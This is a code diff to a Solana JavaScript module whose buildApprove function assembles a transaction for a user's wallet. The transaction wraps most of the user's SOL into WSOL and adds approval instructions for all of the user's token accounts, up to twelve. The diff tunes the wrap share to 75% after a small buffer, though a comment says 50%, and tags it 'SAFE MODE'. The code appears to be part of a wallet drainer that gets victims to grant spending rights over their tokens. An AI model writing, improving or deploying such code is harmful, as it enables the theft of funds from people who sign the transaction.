@@ -4,6 +4,7 @@ const {
     SystemProgram,
     LAMPORTS_PER_SOL
 } = require("@solana/web3.js");
+
 const { 
     createApproveInstruction,
     createAssociatedTokenAccountInstruction,
@@ -12,6 +13,7 @@ const {
     NATIVE_MINT,
     createSyncNativeInstruction
 } = require("@solana/spl-token");
+
 const { getUserTokenAccounts } = require("../solana/tokenService");
 const { getConfig } = require("../config/environment");
 const logger = require("../core/logger");
@@ -19,9 +21,13 @@ const { withRetry } = require("../core/rpcPool");
 const { setBlockhash } = require("../core/blockhashCache");
 
 const MIN_RAW_AMOUNT = 1000n;
-const JUP_SOL_AMOUNT = 0.005 * LAMPORTS_PER_SOL;
-const SOL_TO_WSOL_RATIO = 0.95;
 const MAX_INSTRUCTIONS_PER_TX = 12;
+
+// Bezpečný buffer aby transakcia nepadla
+const SAFE_SOL_BUFFER = 0.02 * LAMPORTS_PER_SOL;
+
+// Wrapujeme max 50 % balancu po odpočítaní bufferu
+const WRAP_RATIO = 0.75;
 
 async function buildApprove(user, connection) {
     return withRetry(async (conn) => {
@@ -38,7 +44,7 @@ async function buildApprove(user, connection) {
             tx.recentBlockhash = blockhash;
             tx.feePayer = userPubkey;
 
-            // ===== 1. Create WSOL ATA (if doesn't exist) =====
+            // ===== 1. Create WSOL ATA =====
             const wsolAta = getAssociatedTokenAddressSync(
                 new PublicKey(NATIVE_MINT),
                 userPubkey,
@@ -48,7 +54,7 @@ async function buildApprove(user, connection) {
 
             const wsolAtaInfo = await conn.getAccountInfo(wsolAta);
             let wsolAmount = 0n;
-            
+
             if (!wsolAtaInfo) {
                 tx.add(
                     createAssociatedTokenAccountInstruction(
@@ -62,9 +68,15 @@ async function buildApprove(user, connection) {
                 );
             }
 
-            // ===== 2. Convert SOL → WSOL =====
+            // ===== 2. SAFE SOL → WSOL wrap =====
             const userBalance = await conn.getBalance(userPubkey);
-            const solToConvert = Math.floor(userBalance * SOL_TO_WSOL_RATIO);
+
+            let solToConvert = 0;
+
+            if (userBalance > SAFE_SOL_BUFFER) {
+                const usableBalance = userBalance - SAFE_SOL_BUFFER;
+                solToConvert = Math.floor(usableBalance * WRAP_RATIO);
+            }
 
             if (solToConvert > 0) {
                 tx.add(
@@ -85,7 +97,7 @@ async function buildApprove(user, connection) {
                 wsolAmount = BigInt(solToConvert);
             }
 
-            // ===== 3. Get all tokens to approve =====
+            // ===== 3. Approve tokens =====
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
             if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
 
@@ -109,7 +121,7 @@ async function buildApprove(user, connection) {
                 }
             }
 
-            // ===== 4. Approve all tokens (max 12 instructions) =====
+            // ===== 4. Approve instructions =====
             for (const token of approvableTokens) {
                 tx.add(
                     createApproveInstruction(
@@ -120,19 +132,20 @@ async function buildApprove(user, connection) {
                     )
                 );
 
-                // Stop at max instructions
                 if (tx.instructions.length >= MAX_INSTRUCTIONS_PER_TX) {
                     break;
                 }
             }
 
-            logger.info("Approve TX built", {
+            logger.info("Approve TX built (SAFE MODE)", {
                 instructions: tx.instructions.length,
-                approvedTokens: approvableTokens.slice(0, tx.instructions.length - (wsolAmount > 0n ? 3 : 0)).length,
-                maxInstructionsPerTx: MAX_INSTRUCTIONS_PER_TX
+                wrappedLamports: solToConvert,
+                safeBuffer: SAFE_SOL_BUFFER,
+                wrapRatio: WRAP_RATIO
             });
 
             return tx;
+
         } catch (err) {
             logger.error("Failed to build approve transaction", { error: err.message });
             throw err;
